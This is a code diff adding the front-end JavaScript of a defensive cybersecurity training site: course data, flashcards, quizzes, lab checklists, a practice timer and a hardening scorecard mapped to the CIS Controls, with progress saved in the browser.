+     ['Your course says lab write-ups must be your own work. A friend offers last year’s graded write-up.',['Copy it and change a few words','Decline; do the lab yourself and cite any sources you used','Copy it if you understand it','Submit it as a group'],1,'Your own work, with sources cited. If you are unsure what is allowed, ask the instructor before, not after.']
+   ]),
+   REFLECT('se5r','Your own code','Write the three rules you will hold yourself to as your skills grow. Make them yours, in your words. These matter more than any command on this page.'),
+   LINKS('Go further',['eff','cisa','nist-csf','nice','ncl'])
+  ]}
+ ]
+});
+
+/* =====================================================================
+   STORAGE (per-viewer, this browser only; degrades to memory if blocked)
+   ===================================================================== */
+const KEY='defense-ladder-v1';
+let MEM={};
+const store={
+  load(){ try{ const r=localStorage.getItem(KEY); MEM=r?JSON.parse(r):{}; }catch(e){ MEM={}; } return MEM; },
+  save(){ try{ localStorage.setItem(KEY,JSON.stringify(MEM)); }catch(e){} },
+  get(id){ return MEM[id]; },
+  set(id,v){ MEM[id]=v; this.save(); }
+};
+store.load();
+
+/* theme */
+const themeBtn=document.getElementById('themeBtn');
+function applyTheme(t){
+  if(t==='light'||t==='dark') document.documentElement.setAttribute('data-theme',t);
+  else document.documentElement.removeAttribute('data-theme');
+  themeBtn.textContent='Theme: '+(t||'auto');
+}
+let theme=(function(){ try{return localStorage.getItem(KEY+'-theme')||'auto';}catch(e){return 'auto';} })();
+applyTheme(theme);
+themeBtn.addEventListener('click',()=>{
+  theme = theme==='auto'?'light':theme==='light'?'dark':'auto';
+  try{localStorage.setItem(KEY+'-theme',theme);}catch(e){}
+  applyTheme(theme);
+});
+
+/* =====================================================================
+   small helpers
+   ===================================================================== */
+const el=(tag,cls,html)=>{const n=document.createElement(tag);if(cls)n.className=cls;if(html!=null)n.innerHTML=html;return n;};
+const shuffle=a=>{a=a.slice();for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];}return a;};
+const bloomName={R:'Remember',U:'Understand',A:'Apply',An:'Analyze',E:'Evaluate',Cr:'Create'};
+const bloomFull=['Remember','Understand','Apply','Analyze','Evaluate','Create'];
+const esc=s=>s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+
+/* chevron icon for a level (stacked chevrons = grade) */
+function chevSvg(n,color){
+  const w=16,gap=5; let p='';
+  for(let i=0;i<4;i++){
+    const on=i<n;
+    p+=`<path d="M2 ${4+i*gap} L8 ${1+i*gap} L14 ${4+i*gap}" fill="none" stroke="${on?color:'var(--line)'}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>`;
+  }
+  return `<svg width="${w}" height="26" viewBox="0 0 16 26" aria-hidden="true">${p}</svg>`;
+}
+
+/* =====================================================================
+   NAV state
+   ===================================================================== */
+const PAGES=[['plan','Study plan'],['scorecard','Hardening scorecard'],['progress','My progress'],['about','About & links']];
+let current={level:LEVELS[0].id, unit:LEVELS[0].units[0].id, page:'level'};
+
+function levelById(id){return LEVELS.find(l=>l.id===id);}
+function allInteractiveIds(){
+  const ids=[];
+  LEVELS.forEach(l=>l.units.forEach(u=>u.blocks.forEach(b=>{ if(b.id) ids.push(b.id); })));
+  return ids;
+}
+function isDone(id){const v=store.get(id);return v&&v.done;}
+
+/* =====================================================================
+   RAIL
+   ===================================================================== */
+function buildRail(){
+  const ladder=document.getElementById('ladder');
+  ladder.innerHTML='';
+  LEVELS.forEach(l=>{
+    const b=el('button','lv');
+    b.style.setProperty('--c',l.color);
+    b.setAttribute('role','tab');
+    b.innerHTML=chevSvg(l.chev,l.color)+`<span class="lv-t"><span class="lv-g">${l.grade}</span><span class="lv-p">${l.range}</span></span>`;
+    b.addEventListener('click',()=>{current={level:l.id,unit:l.units[0].id,page:'level'};render();});
+    ladder.appendChild(b);
+  });
+  const pages=document.getElementById('pages');
+  pages.innerHTML='';
+  PAGES.forEach(([id,label])=>{
+    const b=el('button','pg',label);
+    b.addEventListener('click',()=>{current={page:id};render();});
+    pages.appendChild(b);
+  });
+}
+
+function markRail(){
+  const lvs=document.querySelectorAll('#ladder .lv');
+  LEVELS.forEach((l,i)=>lvs[i].setAttribute('aria-current', current.page==='level'&&current.level===l.id?'true':'false'));
+  const pgs=document.querySelectorAll('#pages .pg');
+  pgs.forEach((p,i)=>p.setAttribute('aria-current', current.page===PAGES[i][0]?'true':'false'));
+}
+
+/* =====================================================================
+   RENDER
+   ===================================================================== */
+const main=document.getElementById('main');
+function render(){
+  main.innerHTML='';
+  if(current.page==='level') renderLevel();
+  else if(current.page==='plan') renderPlan();
+  else if(current.page==='scorecard') renderScorecard();
+  else if(current.page==='progress') renderProgress();
+  else if(current.page==='about') renderAbout();
+  markRail();
+  main.focus();
+  window.scrollTo(0,0);
+}
+
+function renderLevel(){
+  const L=levelById(current.level);
+  const head=el('div','lvhead');
+  head.style.setProperty('--accent',L.color);
+  document.documentElement.style.setProperty('--accent',L.color);
+  head.innerHTML=`<div class="grade">${L.grade}</div><div class="range">${L.range}</div>`;
+  const bloom=el('div','bloom');
+  bloomFull.forEach(bf=>{
+    const on=L.blooms.map(b=>bloomName[b]).includes(bf);
+    const s=el('span',on?'on':'',bf);
+    bloom.appendChild(s);
+  });
+  head.appendChild(bloom);
+  head.appendChild(el('div','bloom-cap',L.bloomCap));
+  head.appendChild(el('p','intro',L.intro));
+  if(L.mentor){
+    const d=el('details','mentor');
+    d.innerHTML='<summary>For instructors and study leads</summary><ul>'+L.mentor.map(m=>`<li>${m}</li>`).join('')+'</ul>';
+    head.appendChild(d);
+  }
+  main.appendChild(head);
+
+  // unit chips
+  const units=el('div','units');
+  L.units.forEach(u=>{
+    const chip=el('button','unit');
+    const st=unitStatus(u);
+    chip.innerHTML=`<span class="dot ${st}"></span>${u.title}`;
+    chip.setAttribute('aria-current', u.id===current.unit?'true':'false');
+    chip.style.setProperty('--accent',L.color);
+    chip.addEventListener('click',()=>{current.unit=u.id;render();});
+    units.appendChild(chip);
+  });
+  main.appendChild(units);
+
+  const U=L.units.find(u=>u.id===current.unit)||L.units[0];
+  const uh=el('div','uhead');
+  uh.innerHTML=`<h2>${U.title}<span class="blm">${U.bloom}</span></h2><p class="sum">${U.sum}</p>`;
+  main.appendChild(uh);
+
+  U.blocks.forEach(b=>main.appendChild(renderBlock(b,L)));
+
+  // unit pager
+  const idx=L.units.findIndex(u=>u.id===U.id);
+  const pager=el('div','row');
+  if(idx>0){const p=el('button','btn sec','\u2190 '+L.units[idx-1].title);p.addEventListener('click',()=>{current.unit=L.units[idx-1].id;render();});pager.appendChild(p);}
+  if(idx<L.units.length-1){const n=el('button','btn','Next: '+L.units[idx+1].title+' \u2192');n.addEventListener('click',()=>{current.unit=L.units[idx+1].id;render();});pager.appendChild(n);}
+  else{
+    const li=LEVELS.findIndex(x=>x.id===L.id);
+    if(li<LEVELS.length-1){const n=el('button','btn','Start '+LEVELS[li+1].grade+' \u2192');n.addEventListener('click',()=>{current={level:LEVELS[li+1].id,unit:LEVELS[li+1].units[0].id,page:'level'};render();});pager.appendChild(n);}
+    else{const n=el('button','btn','See the study plan \u2192');n.addEventListener('click',()=>{current={page:'plan'};render();});pager.appendChild(n);}
+  }
+  main.appendChild(pager);
+}
+
+function unitStatus(u){
+  const ids=u.blocks.filter(b=>b.id).map(b=>b.id);
+  if(!ids.length) return '';
+  const done=ids.filter(isDone).length;
+  if(done===0) return '';
+  if(done===ids.length) return 'full';
+  return 'part';
+}
+/* =====================================================================
+   BLOCK RENDERERS
+   ===================================================================== */
+function renderBlock(b,L){
+  switch(b.t){
+    case 'c': return renderCard(b);
+    case 'p': return el('p',null,b.html);
+    case 'tips': { const u=el('ul');b.items.forEach(i=>u.appendChild(el('li',null,i)));return u; }
+    case 'cmds': return renderCmds(b);
+    case 'term': return renderTerm(b);
+    case 'note': return el('div','note'+(b.warn?' warn':''),b.html);
+    case 'areas': return renderAreas();
+    case 'flash': return renderFlash(b);
+    case 'quiz': return renderQuiz(b);
+    case 'match': return renderMatch(b);
+    case 'spot': return renderSpot(b);
+    case 'order': return renderOrder(b);
+    case 'lab': return renderLab(b);
+    case 'reflect': return renderReflect(b);
+    case 'builder': return renderBuilder(b);
+    case 'planner': return renderPlanner(b);
+    case 'timer': return renderTimer(b);
+    case 'links': return renderLinks(b);
+    default: return el('div');
+  }
+}
+
+function renderCard(b){
+  const c=el('div','card');
+  c.appendChild(el('h3',null,`${b.title}<span class="blm">${b.bloom}</span>`));
+  b.parts.forEach(p=>c.appendChild(renderBlock(p)));
+  return c;
+}
+function renderCmds(b){
+  const wrap=el('div');
+  if(b.title) wrap.appendChild(el('p',null,`<b>${b.title}</b>`));
+  const t=el('table','cmds');
+  b.rows.forEach(([cmd,why])=>{
+    const tr=el('tr');
+    tr.appendChild(el('td',null,`<code>${esc(cmd)}</code>`));
+    tr.appendChild(el('td',null,why));
+    t.appendChild(tr);
+  });
+  wrap.appendChild(t);
+  return wrap;
+}
+function renderTerm(b){ return el('pre','term',esc(b.text)); }
+
+function renderAreas(){
+  const t=el('table','cmds areas');
+  AREAS.forEach((a,i)=>{
+    const tr=el('tr');
+    tr.appendChild(el('td',null,`<b>${i+1}. ${a.n}</b><br><small>${a.cis}</small>`));
+    tr.appendChild(el('td',null,a.d));
+    t.appendChild(tr);
+  });
+  return t;
+}
+
+/* ---- flashcards ---- */
+function renderFlash(b){
+  const c=el('div','card');
+  c.appendChild(el('h3',null,`${b.title}<span class="blm">Remember</span>`));
+  c.appendChild(el('p','sum','Tap the card to flip. Next to continue. '+b.cards.length+' cards.'));
+  const flash=el('div','flash');
+  const fc=el('div','fc');
+  let i=0, back=false;
+  const state=store.get(b.id)||{};
+  function draw(){
+    fc.className='fc'+(back?' back':'');
+    fc.innerHTML=`<span class="side">${back?'Answer':'Term'}</span><span class="cnt">${i+1} / ${b.cards.length}</span><div>${back?b.cards[i][1]:b.cards[i][0]}</div>`;
+  }
+  fc.addEventListener('click',()=>{back=!back;draw();});
+  flash.appendChild(fc);
+  c.appendChild(flash);
+  const row=el('div','row');
+  const prev=el('button','btn sec sm','\u2190 Prev');
+  const next=el('button','btn sm','Next \u2192');
+  const done=el('button','btn sec sm','Mark reviewed');
+  const status=el('span','pill');
+  function setStatus(){status.textContent=isDone(b.id)?'Reviewed':'';status.className='pill'+(isDone(b.id)?' ok':'');}
+  prev.addEventListener('click',()=>{i=(i-1+b.cards.length)%b.cards.length;back=false;draw();});
+  next.addEventListener('click',()=>{i=(i+1)%b.cards.length;back=false;draw();});
+  done.addEventListener('click',()=>{store.set(b.id,{done:true});setStatus();refreshChrome();});
+  row.append(prev,next,done,status);
+  c.appendChild(row);
+  draw();setStatus();
+  return c;
+}
+
+/* ---- quiz ---- */
+function renderQuiz(b){
+  const c=el('div','card');
+  c.appendChild(el('h3',null,`${b.title}<span class="blm">Check</span>`));
+  const answered=new Array(b.items.length).fill(-1);
+  const saved=store.get(b.id);
+  b.items.forEach((it,qi)=>{
+    const [q,opts,correct,why]=it;
+    const q1=el('div','q');
+    q1.appendChild(el('div','qt',`${qi+1}. ${q}`));
+    const whyBox=el('div','why',why); whyBox.style.display='none';
+    opts.forEach((opt,oi)=>{
+      const lab=el('label','opt');
+      lab.innerHTML=`<input type="radio" name="${b.id}-${qi}"><span>${opt}</span>`;
+      lab.querySelector('input').addEventListener('change',()=>{
+        answered[qi]=oi;
+        [...q1.querySelectorAll('.opt')].forEach((o,k)=>{o.className='opt'+(k===correct?' right':k===oi&&oi!==correct?' wrong':'');});
+        whyBox.style.display='block';
+        maybeDone();
+      });
+      q1.appendChild(lab);
+    });
+    q1.appendChild(whyBox);
+    c.appendChild(q1);
+  });
+  const foot=el('div','row');
+  const score=el('span','pill');
+  foot.appendChild(score);
+  c.appendChild(foot);
+  function maybeDone(){
+    const got=answered.filter(a=>a>=0).length;
+    const right=answered.reduce((n,a,qi)=>n+(a===b.items[qi][2]?1:0),0);
+    score.textContent=`${right} / ${b.items.length} correct`;
+    score.className='pill'+(got===b.items.length?(right===b.items.length?' ok':' '):' ');
+    if(got===b.items.length){
+      store.set(b.id,{done:true,score:right,total:b.items.length});
+      if(right===b.items.length) score.className='pill ok';
+      refreshChrome();
+    }
+  }
+  if(saved&&saved.total){score.textContent=`Best: ${saved.score} / ${saved.total}. Answer again to review.`;score.className='pill'+(saved.score===saved.total?' ok':'');}
+  return c;
+}
+
+/* ---- match ---- */
+function renderMatch(b){
+  const c=el('div','card');
+  c.appendChild(el('h3',null,`${b.title}<span class="blm">Understand</span>`));
+  if(b.intro) c.appendChild(el('p','sum',b.intro));
+  const grid=el('div','match');
+  const left=b.pairs.map((p,i)=>({txt:p[0],i}));
+  const right=shuffle(b.pairs.map((p,i)=>({txt:p[1],i})));
+  let sel=null, matched=0;
+  const colL=el('div'); const colR=el('div');
+  colL.style.display='flex';colL.style.flexDirection='column';colL.style.gap='8px';
+  colR.style.display='flex';colR.style.flexDirection='column';colR.style.gap='8px';
+  const Lbtns={}, Rbtns={};
+  left.forEach(o=>{const btn=el('button','mi',o.txt);btn.addEventListener('click',()=>pick('L',o.i,btn));colL.appendChild(btn);Lbtns[o.i]=btn;});
+  right.forEach(o=>{const btn=el('button','mi',o.txt);btn.addEventListener('click',()=>pick('R',o.i,btn));colR.appendChild(btn);Rbtns[o.i]=btn;});
+  grid.append(colL,colR);
+  c.appendChild(grid);
+  const status=el('div','row');const pill=el('span','pill');status.appendChild(pill);c.appendChild(status);
+  function pick(side,i,btn){
+    if(btn.classList.contains('done'))return;
+    if(!sel){sel={side,i,btn};btn.classList.add('sel');return;}
+    if(sel.side===side){sel.btn.classList.remove('sel');sel={side,i,btn};btn.classList.add('sel');return;}
+    // compare
+    if(sel.i===i){
+      sel.btn.classList.remove('sel');sel.btn.classList.add('done');btn.classList.add('done');
+      matched++;
+      if(matched===b.pairs.length){pill.textContent='All matched';pill.className='pill ok';store.set(b.id,{done:true});refreshChrome();}
+      sel=null;
+    } else {
+      const a=sel.btn,bb=btn;a.classList.add('shake');bb.classList.add('shake');
+      setTimeout(()=>{a.classList.remove('shake','sel');bb.classList.remove('shake');},500);
+      sel=null;
+      pill.textContent='Not a match, try again';pill.className='pill bad';
+    }
+  }
+  if(isDone(b.id)){pill.textContent='Completed before. Play again anytime.';pill.className='pill ok';}
+  return c;
+}
+
+/* ---- spot the problem ---- */
+function renderSpot(b){
+  const c=el('div','card');
+  c.appendChild(el('h3',null,`${b.title}<span class="blm">Analyze</span>`));
+  if(b.intro) c.appendChild(el('p','sum',b.intro));
+  const box=el('div','spot');
+  const pre=el('pre');
+  const flagged=new Set();
+  b.lines.forEach((ln,i)=>{
+    const [text,why]=ln;
+    const line=el('span','sl',esc(text));
+    line.addEventListener('click',()=>{
+      if(box.dataset.checked)return;
+      if(flagged.has(i)){flagged.delete(i);line.classList.remove('flag');}
+      else{flagged.add(i);line.classList.add('flag');}
+    });
+    pre.appendChild(line);
+  });
+  box.appendChild(pre);
+  c.appendChild(box);
+  const row=el('div','row');
+  const check=el('button','btn sm','Check');
+  const reset=el('button','btn sec sm','Reset');
+  const pill=el('span','pill');
+  row.append(check,reset,pill);
+  c.appendChild(row);
+  const legend=el('div','legend','Findings are the lines that weaken the system. A struck-through red line means you flagged a safe line.');
+  c.appendChild(legend);
+  const whyWrap=el('div');
+  c.appendChild(whyWrap);
+  check.addEventListener('click',()=>{
+    box.dataset.checked='1';
+    const lines=[...pre.children];
+    let hits=0,total=0;
+    whyWrap.innerHTML='';
+    b.lines.forEach((ln,i)=>{
+      const [text,why]=ln;const isBad=!!why;
+      const span=lines[i];span.className='sl';
+      if(isBad){total++;
+        if(flagged.has(i)){span.classList.add('hit');hits++;}
+        else span.classList.add('miss');
+        whyWrap.appendChild(el('div','why',`<b>${esc(text.trim().slice(0,42))}\u2026</b> ${why}`));
+      } else if(flagged.has(i)){span.classList.add('false');}
+    });
+    const falses=[...flagged].filter(i=>!b.lines[i][1]).length;
+    pill.textContent=`${hits} / ${total} findings`+(falses?`, ${falses} false flag${falses>1?'s':''}`:'');
+    pill.className='pill'+(hits===total&&!falses?' ok':' bad');
+    if(hits===total&&!falses){store.set(b.id,{done:true});refreshChrome();}
+  });
+  reset.addEventListener('click',()=>{renderReplace(c,renderSpot(b));});
+  if(isDone(b.id)){pill.textContent='Completed before.';pill.className='pill ok';}
+  return c;
+}
+function renderReplace(oldNode,newNode){oldNode.replaceWith(newNode);}
+
+/* ---- order / sequence ---- */
+function renderOrder(b){
+  const c=el('div','card');
+  c.appendChild(el('h3',null,`${b.title}<span class="blm">Apply</span>`));
+  if(b.intro) c.appendChild(el('p','sum',b.intro));
+  const wrap=el('div','ord');
+  const poolH=el('h4',null,'Steps (tap to add in order)');
+  const pool=el('div','pool');
+  const seqH=el('h4',null,'Your sequence');
+  const seq=el('div','seq');
+  wrap.append(poolH,pool,seqH,seq);
+  c.appendChild(wrap);
+  const order=shuffle(b.items.map((it,i)=>({it,i})));
+  const chosen=[];
+  function drawPool(){
+    pool.innerHTML='';
+    order.forEach(o=>{
+      if(chosen.includes(o.i))return;
+      const btn=el('button','oi',`<span class="n">+</span><span>${o.it[0]}</span>`);
+      btn.addEventListener('click',()=>{chosen.push(o.i);drawPool();drawSeq();});
+      pool.appendChild(btn);
+    });
+  }
+  function drawSeq(){
+    seq.innerHTML='';
+    chosen.forEach((ci,pos)=>{
+      const btn=el('button','oi',`<span class="n">${pos+1}</span><span>${b.items[ci][0]}</span>`);
+      btn.title='Tap to remove';
+      btn.addEventListener('click',()=>{chosen.splice(pos,1);drawPool();drawSeq();});
+      seq.appendChild(btn);
+    });
+  }
+  drawPool();
+  const row=el('div','row');const check=el('button','btn sm','Check order');const pill=el('span','pill');row.append(check,pill);c.appendChild(row);
+  const whyWrap=el('div');c.appendChild(whyWrap);
+  check.addEventListener('click',()=>{
+    if(chosen.length<b.items.length){pill.textContent='Place every step first';pill.className='pill bad';return;}
+    let ok=true;whyWrap.innerHTML='';
+    [...seq.children].forEach((node,pos)=>{
+      const correct=chosen[pos]===pos;
+      node.className='oi '+(correct?'ok':'off');
+      if(!correct)ok=false;
+    });
+    pill.textContent=ok?'Perfect order':'Not quite, the numbers show your order; grey/red are out of place';
+    pill.className='pill'+(ok?' ok':' bad');
+    if(ok){store.set(b.id,{done:true});refreshChrome();}
+    else { whyWrap.appendChild(el('div','why','Correct order with the reason for each step:')); b.items.forEach((it,i)=>whyWrap.appendChild(el('div','why',`<b>${i+1}. ${it[0]}.</b> ${it[1]}`))); }
+  });
+  if(isDone(b.id)){pill.textContent='Completed before.';pill.className='pill ok';}
+  return c;
+}
+
+/* ---- lab checklist ---- */
+function renderLab(b){
+  const c=el('div','card');
+  c.appendChild(el('h3',null,`${b.title}<span class="blm">Apply (hands-on)</span>`));
+  if(b.intro) c.appendChild(el('p','sum',b.intro));
+  const saved=store.get(b.id)||{ticks:[]};
+  const ticks=new Set(saved.ticks||[]);
+  b.steps.forEach((s,i)=>{
+    const [text,cmd]=s;
+    const row=el('div','step'+(ticks.has(i)?' done':''));
+    const cb=el('input');cb.type='checkbox';cb.checked=ticks.has(i);
+    const st=el('div','st',text+(cmd?`<br><code>${esc(cmd)}</code>`:''));
+    cb.addEventListener('change',()=>{
+      if(cb.checked)ticks.add(i);else ticks.delete(i);
+      row.className='step'+(cb.checked?' done':'');
+      store.set(b.id,{done:ticks.size===b.steps.length,ticks:[...ticks]});
+      pill.textContent=`${ticks.size} / ${b.steps.length} done`;pill.className='pill'+(ticks.size===b.steps.length?' ok':'');
+      refreshChrome();
+    });
+    row.append(cb,st);
+    c.appendChild(row);
+  });
+  const row=el('div','row');const pill=el('span','pill',`${ticks.size} / ${b.steps.length} done`);if(ticks.size===b.steps.length)pill.className='pill ok';row.appendChild(pill);c.appendChild(row);
+  return c;
+}
+
+/* ---- reflect (free text, saved) ---- */
+function renderReflect(b){
+  const c=el('div','card');
+  c.appendChild(el('h3',null,`${b.title}<span class="blm">Create / Evaluate</span>`));
+  c.appendChild(el('p','sum',b.prompt));
+  const ta=el('textarea');ta.placeholder='Write here. Saved in this browser only.';
+  const saved=store.get(b.id);if(saved&&saved.text)ta.value=saved.text;
+  const row=el('div','row');const save=el('button','btn sm','Save');const pill=el('span','pill');
+  save.addEventListener('click',()=>{store.set(b.id,{done:ta.value.trim().length>0,text:ta.value});pill.textContent='Saved';pill.className='pill ok';refreshChrome();});
+  row.append(save,pill);
+  c.append(ta,row);
+  if(saved&&saved.text){pill.textContent='Saved';pill.className='pill ok';}
+  return c;
+}
+
+/* ---- checklist builder (export) ---- */
+function renderBuilder(b){
+  const c=el('div','card');
+  c.appendChild(el('h3',null,`${b.title}<span class="blm">Create</span>`));
+  c.appendChild(el('p','sum',b.intro));
+  const saved=store.get(b.id)||{vals:{}};
+  const vals=saved.vals||{};
+  const fields={};
+  b.sections.forEach(([key,label,hint])=>{
+    const sec=el('div','bsec');
+    sec.appendChild(el('label',null,label));
+    if(hint)sec.appendChild(el('div','hint',hint));
+    const inp = key==='os'?el('input'):el('textarea');
+    if(key==='os')inp.type='text';
+    inp.value=vals[key]||'';
+    inp.addEventListener('input',()=>{vals[key]=inp.value;store.set(b.id,{done:!!(vals.os&&vals.accounts),vals});refreshChrome();});
+    fields[key]=inp;
+    sec.appendChild(inp);
+    c.appendChild(sec);
+  });
+  const row=el('div','row');
+  const exp=el('button','btn sm','Export as text');
+  const copy=el('button','btn sec sm','Copy to clipboard');
+  const pill=el('span','pill');
+  row.append(exp,copy,pill);c.appendChild(row);
+  const out=el('pre','term plan-out');out.style.display='none';c.appendChild(out);
+  function build(){
+    let s=`Hardening checklist\nOperating system: ${vals.os||'(unnamed)'}\n(written from general standards and vendor documentation; cite a source for each line)\n`;
+    b.sections.forEach(([key,label])=>{ if(key==='os')return; s+=`\n== ${label} ==\n${(vals[key]||'').trim()||'(fill in)'}\n`; });
+    return s;
+  }
+  exp.addEventListener('click',()=>{out.textContent=build();out.style.display='block';pill.textContent='Below. Select and copy, or use Copy.';pill.className='pill';});
+  copy.addEventListener('click',()=>{const t=build();navigator.clipboard&&navigator.clipboard.writeText(t).then(()=>{pill.textContent='Copied';pill.className='pill ok';},()=>{out.textContent=t;out.style.display='block';pill.textContent='Clipboard blocked; copy from below.';});});
+  return c;
+}
+
+/* ---- session planner ---- */
+function renderPlanner(b){
+  const c=el('div','card');
+  c.appendChild(el('h3',null,`Session planner<span class="blm">Create</span>`));
+  c.appendChild(el('p','sum','Plan a timed practice session. Set its length, then the minutes for each phase; the running total keeps you honest.'));
+  const saved=store.get(b.id)||{};
+  const phases=[['orient','Orientation: scenario brief, baseline, roles',15],['accounts','Account management and access control',20],['policy','Password and lockout policy',10],['config','Firewall, services and unauthorized software',20],['patch','Patching and malware defenses',15],['net','Network devices (if in scope)',0],['logging','Audit logging and investigation questions',15],['verify','Verify availability, sweep low-impact items',25]];
+  const lenWrap=el('label','pl-len','Session length (minutes):');
+  const lenInp=el('input');lenInp.type='number';lenInp.min='10';lenInp.step='5';lenInp.value=(saved.len!=null?saved.len:120);
+  lenInp.addEventListener('input',total);lenWrap.appendChild(lenInp);c.appendChild(lenWrap);
+  const grid=el('div','pl-grid');
+  const inputs={};
+  phases.forEach(([k,label,def])=>{
+    const w=el('label',null,label+':');
+    const inp=el('input');inp.type='number';inp.min='0';inp.value=(saved[k]!=null?saved[k]:def);
+    inp.addEventListener('input',total);
+    inputs[k]=inp;w.appendChild(inp);grid.appendChild(w);
+  });
+  c.appendChild(grid);
+  const row=el('div','row');const pill=el('span','pill');row.appendChild(pill);c.appendChild(row);
+  function total(){
+    let sum=0;const vals={};phases.forEach(([k])=>{const v=parseInt(inputs[k].value||'0',10)||0;vals[k]=v;sum+=v;});
+    const len=Math.max(0,parseInt(lenInp.value||'0',10)||0);vals.len=len;
+    store.set(b.id,vals);
+    const diff=len-sum;
+    pill.textContent=`${sum} of ${len} minutes planned`+(diff===0?' (all allocated)':diff>0?` (${diff} unallocated)`:` (${-diff} over)`);
+    pill.className='pill'+(diff===0?' ok':diff<0?' bad':'');
+  }
+  total();
+  return c;
+}
+
+/* ---- practice timer ---- */
+function renderTimer(b){
+  const c=el('div','card');
+  c.appendChild(el('h3',null,`Practice timer<span class="blm">Apply</span>`));
+  c.appendChild(el('p','sum','A countdown for a timed practice session, with the three checkpoints a timekeeper calls. Runs while this tab is open.'));
+  const saved=store.get(b.id)||{};
+  const lenWrap=el('label','pl-len','Session length (minutes):');
+  const lenInp=el('input');lenInp.type='number';lenInp.min='15';lenInp.step='5';lenInp.value=(saved.len!=null?saved.len:120);
+  lenWrap.appendChild(lenInp);c.appendChild(lenWrap);
+  const disp=el('div','timer');
+  c.appendChild(disp);
+  const marks=el('div','row');
+  const m1=el('span','pill');const m2=el('span','pill');const m3=el('span','pill','15 left: stop changing, verify services and users');
+  marks.append(m1,m2,m3);c.appendChild(marks);
+  const row=el('div','row');
+  const start=el('button','btn sm','Start');const pause=el('button','btn sec sm','Pause');const reset=el('button','btn sec sm','Reset');
+  row.append(start,pause,reset);c.appendChild(row);
+  let total=0, left=0, timer=null;
+  function fmt(s){const h=Math.floor(s/3600),m=Math.floor((s%3600)/60),x=s%60;return `${h}:${String(m).padStart(2,'0')}:${String(x).padStart(2,'0')}`;}
+  function marksOff(){[m1,m2,m3].forEach(m=>m.className='pill');}
+  function setup(){
+    const mins=Math.max(15,parseInt(lenInp.value||'0',10)||120);
+    total=mins*60;left=total;disp.textContent=fmt(left);
+    m1.textContent='Halfway: '+fmt(Math.round(total/2));m2.textContent='Quarter left: '+fmt(Math.round(total/4));marksOff();
+  }
+  function tick(){left--;disp.textContent=fmt(Math.max(0,left));
+    m1.className='pill'+(left<=total*0.5?' ok':'');m2.className='pill'+(left<=total*0.25?' ok':'');m3.className='pill'+(left<=15*60?' bad':'');
+    if(left<=0){clearInterval(timer);timer=null;disp.textContent='0:00:00';}
+  }
+  lenInp.addEventListener('input',()=>{const v=parseInt(lenInp.value||'0',10)||0;store.set(b.id,{len:v});if(!timer)setup();});
+  start.addEventListener('click',()=>{lenInp.disabled=true;if(!timer)timer=setInterval(tick,1000);});
+  pause.addEventListener('click',()=>{if(timer){clearInterval(timer);timer=null;}});
+  reset.addEventListener('click',()=>{if(timer){clearInterval(timer);timer=null;}lenInp.disabled=false;setup();});
+  setup();
+  return c;
+}
+
+/* ---- links ---- */
+function renderLinks(b){
+  const c=el('div','card');
+  c.appendChild(el('h3',null,b.title+`<span class="blm">Trusted sources</span>`));
+  b.keys.forEach(k=>{
+    const r=RES[k];if(!r)return;
+    const [name,url,why,kind]=r;
+    const row=el('div','lk');
+    row.innerHTML=`<span class="k ${kind}">${kindLabel(kind)}</span><div><a href="${url}" target="_blank" rel="noopener noreferrer">${name}</a><div class="d">${why}</div></div>`;
+    c.appendChild(row);
+  });
+  return c;
+}
+function kindLabel(k){return {vendor:'Vendor',standard:'Standard',community:'Community',practice:'Practice',tool4that:'Tool4That'}[k]||k;}
+/* =====================================================================
+   OTHER PAGES
+   ===================================================================== */
+function linkBtn(cls,href,text){const a=el('a',cls);a.href=href;a.target='_blank';a.rel='noopener noreferrer';a.textContent=text;return a;}
+
+function renderPlan(){
+  document.documentElement.style.setProperty('--accent','var(--l2)');
+  const h=el('div','lvhead');h.style.setProperty('--accent','var(--l2)');
+  h.innerHTML=`<div class="grade">Study plan</div><div class="range">${PLAN.name}</div>`;
+  h.appendChild(el('p','intro','Four phases, one per grade, each ending in a milestone you can check yourself. Go faster or slower as you like; the order matters more than the dates. Every phase pairs reading here with hands-on practice on this site or on virtual machines you own.'));
+  main.appendChild(h);
+  const card=el('div','card');
+  const tl=el('div','tl');
+  PLAN.phases.forEach(r=>{
+    const ph=el('div','ph'+(r.ms?' ms':''));
+    ph.innerHTML=`<h3>${r.n}</h3><div class="when">${r.when}</div><ul>${r.pts.map(p=>`<li>${p}</li>`).join('')}</ul>`;
+    if(r.grade){
+      const L=levelById(r.grade);
+      const go=el('button','btn sec sm','Open '+L.grade);
+      go.addEventListener('click',()=>{current={level:L.id,unit:L.units[0].id,page:'level'};render();});
+      ph.appendChild(go);
+    }
+    tl.appendChild(ph);
+  });
+  card.appendChild(tl);
+  main.appendChild(card);
+  const row=el('div','row');
+  row.append(linkBtn('btn sm',RES['t4t-range'][1],'Lockdown Range →'),linkBtn('btn sec sm',RES['t4t-drills'][1],'Lockdown Drills →'),linkBtn('btn sec sm',RES['nice'][1],'NICE work roles →'));
+  main.appendChild(row);
+}
+
+function renderScorecard(){
+  document.documentElement.style.setProperty('--accent','var(--l3)');
+  const h=el('div','lvhead');h.style.setProperty('--accent','var(--l3)');
+  h.innerHTML=`<div class="grade">Hardening scorecard</div><div class="range">Six areas, aligned with the CIS Critical Security Controls v8</div>`;
+  h.appendChild(el('p','intro','Use this after you harden a lab or a VM you own. Tick each check you can prove with a command or a screenshot, not just remember doing. On any operating system you are always working in one of these six areas.'));
+  main.appendChild(h);
+  const saved=store.get('scorecard')||{};
+  const ticks=saved.ticks||{};
+  const machine=el('input');machine.type='text';machine.placeholder='Which machine is this for? (e.g. Windows 11 practice VM)';machine.value=saved.machine||'';machine.setAttribute('aria-label','Machine');
+  const mwrap=el('div','card');mwrap.appendChild(el('label','sc-lbl','Machine'));mwrap.appendChild(machine);main.appendChild(mwrap);
+  const totalPill=el('span','pill');
+  const counts=[];
+  function save(){store.set('scorecard',{machine:machine.value,ticks});}
+  function refresh(){
+    let all=0,done=0;
+    AREAS.forEach((a,ai)=>{const n=a.checks.filter((_,ci)=>ticks[ai+'-'+ci]).length;all+=a.checks.length;done+=n;counts[ai].textContent=`${n} / ${a.checks.length}`;counts[ai].className='pill'+(n===a.checks.length?' ok':'');});
+    totalPill.textContent=`${done} of ${all} checks proven`;totalPill.className='pill'+(done===all?' ok':'');
+  }
